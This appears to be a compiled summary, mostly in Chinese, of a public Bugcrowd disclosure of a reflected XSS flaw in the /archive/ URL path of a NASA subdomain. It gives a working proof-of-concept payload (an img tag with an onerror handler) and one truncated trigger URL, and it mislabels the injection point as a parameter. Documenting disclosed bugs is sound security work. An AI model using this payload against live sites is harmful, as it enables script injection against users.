# Reflected XSS via URL Path in /archive/ Endpoint - CrowdStream - Bugcrowd
目标站点: seabass.gsfc.nasa.gov
报告地址: https://bugcrowd.com/disclosures/655092e1-8200-4089-a42f-3803edfdeadd/reflected-xss-via-url-path-in-archive-endpoint

## 触发 URL
- https://seabass.gsfc.nasa.gov/archive/<Img

## 利用方法
漏洞类型: 反射型 XSS (Reflected)
注入参数: in
关键描述:
- Reflected XSS via URL Path in /archive/ Endpoint - CrowdStream - Bugcrowd
- Reflected XSS via URL Path in /archive/ Endpoint
- There was a Reflected Cross-Site Scripting (XSS) vulnerability on the following subdomain:
关键 Payload:
- `https://seabass.gsfc.nasa.gov/archive/<Img src=1 onerror=alert()>`
